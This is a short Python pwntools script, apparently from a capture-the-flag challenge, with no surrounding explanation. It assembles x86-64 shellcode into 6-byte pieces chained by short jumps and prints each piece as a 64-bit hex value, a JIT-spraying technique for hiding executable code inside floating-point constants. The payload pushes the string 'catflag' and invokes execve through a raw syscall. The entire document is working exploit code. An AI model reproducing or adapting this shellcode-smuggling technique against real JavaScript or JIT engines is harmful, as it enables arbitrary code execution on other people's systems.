from pwn import *
context(arch='amd64')
jmp = b'\xeb\x0c'
shell_hi = 0x0067616c
shell_lo = 0x66746163
def make_double(code):
    assert len(code) <= 6
    print(hex(u64(code.ljust(6, b'\x90') + jmp))[2:])

make_double(asm("mov eax,%d" % (0x0067616c)))
make_double(asm("mov ebx,%d" % (0x66746163)))
make_double(asm("shl rax, 0x20"))
make_double(asm("add rax,rbx;push rax"))
make_double(asm("mov rdi, rsp;xor esi, esi;"))
code = asm("xor edx, edx;push 0x3b; pop rax; syscall")
assert len(code) <= 8
print(hex(u64(code.ljust(8, b'\x90')))[2:])